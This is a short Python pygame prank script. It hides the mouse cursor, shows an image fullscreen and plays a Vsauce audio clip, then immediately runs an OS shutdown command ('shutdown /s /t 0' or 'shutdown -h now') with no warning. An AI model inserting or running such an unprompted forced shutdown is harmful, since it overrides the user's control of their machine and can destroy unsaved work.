import os, platform
import pygame, time

# Init

pygame.init()
pygame.display.init()

pygame.mouse.set_visible(False) # Hiding the mouse
pygame.mouse.set_pos((-100, -100))

image = pygame.image.load('image.png')
audio = pygame.mixer.Sound('vsauce.mp3')

# Displaying the image, scaling and stuff

screen_size = pygame.display.Info()
image_aspect_ratio = image.get_width() / image.get_height()

if image_aspect_ratio > screen_size.current_w / screen_size.current_h:
    
    new_width = screen_size.current_w
    new_height = int(new_width / image_aspect_ratio)
else:
    
    new_height = screen_size.current_h
    new_width = int(new_height * image_aspect_ratio)


image = pygame.transform.scale(image, (new_width, new_height))

screen = pygame.display.set_mode(image.get_size(), pygame.FULLSCREEN)

x_pos = (screen_size.current_w - new_width) // 2
y_pos = (screen_size.current_h - new_height) // 2
screen.blit(image, (x_pos, y_pos))
pygame.display.flip()

# Play audio

audio_duration = audio.get_length()
audio.play()

time.sleep(audio_duration) 
pygame.mouse.set_visible(True) # Enable the mouse just in case.
pygame.mouse.set_pos((0, 0))

pygame.quit() # Quit PyGame

# Shutdown because why not

if platform.system() == "Windows":
    os.system("shutdown /s /t 0")
else:
    os.system("shutdown -h now")